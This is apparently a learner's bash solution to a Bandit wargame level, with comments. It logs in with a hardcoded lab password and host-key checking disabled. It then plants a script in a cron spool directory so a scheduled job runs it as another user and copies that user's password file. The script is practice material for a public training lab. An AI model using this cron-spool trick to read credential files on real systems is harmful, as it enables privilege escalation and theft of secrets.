#!/bin/bash


# A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

# NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level # nahh i am noob

# NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…


host="bandit.labs.overthewire.org"
port=2220
user="bandit23"
password=0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

# sshpass -p $password ssh -o StrictHostKeyChecking=no -p $port $user@$host 
sshpass -p $password ssh -o StrictHostKeyChecking=no -p $port $user@$host << 'EOF'

cd /tmp/   
mkdir vivek
cd vivek
pwd

# echo '#!/bin/bash cat /etc/bandit_pass/bandit24 > /tmp/vivek/pass' > script.sh
cat << 'EOL' > script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/vivek/pass
EOL

# chmod +x script.sh # this dosen't work due to ownership issues
chmod 777 script.sh
cat script.sh
touch pass
chmod 666 pass
cp script.sh /var/spool/bandit24/foo/
echo "Wait for 1 min ... "
sleep 70

echo "Pasword for bandit 24 is : "
cat pass

rm -rf /tmp/vivek
cd /tmp/vivek/ | & 

EOF

# cd 
# cat cronjob_bandit24

# inside cronjob_bandit24
# bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
# #!/bin/bash

# myname=$(whoami)

# cd /var/spool/$myname/foo
# echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
# for i in * .*;
# do
#     if [ "$i" != "." -a "$i" != ".." ];
#     then
#         echo "Handling $i"
#         owner="$(stat --format "%U" ./$i)"
#         if [ "${owner}" = "bandit23" ]; then
#             timeout -s 9 60 ./$i
#         fi
#         rm -f ./$i
#     fi
# done

# nahh how can -a mean 'And' operator in bash 
# the script deleted everything crteated by bandit23 within a 60 second timeout and it deletes everything from /var/spool/bandit23/ files but before deleting it executes it
# the script explanation with exploit that i can use : https://chatgpt.com/share/68b2c9f9-2f9c-8006-be9e-b35e891c4321
# so basically if i create a script and paste it inside the /var/spool/bandit24 file it will run it as bandit 24 which we can exploit to cat the pass of bandit24

# i can't solve it the script won't run don't know why !


# ----gpt can't help had to resarch on my own 
# https://medium.com/secttp/overthewire-bandit-level-23-424786d305bf   # worked using this blog as refernce

# bandit23@bandit:/etc/cron.d$ stat cronjob_bandit24 --format '%U'
# root
# bandit23@bandit:/etc/cron.d$ stat cronjob_bandit23
#   File: cronjob_bandit23
#   Size: 122             Blocks: 8          IO Block: 4096   regular file
# Device: 259,1   Inode: 86700       Links: 1
# Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
# Access: 2025-08-29 15:53:27.463650408 +0000
# Modify: 2025-08-15 13:16:05.059024868 +0000
# Change: 2025-08-15 13:16:05.059024868 +0000
#  Birth: 2025-08-15 13:16:05.059024868 +0000

# --------------below will be my script created inside the remote server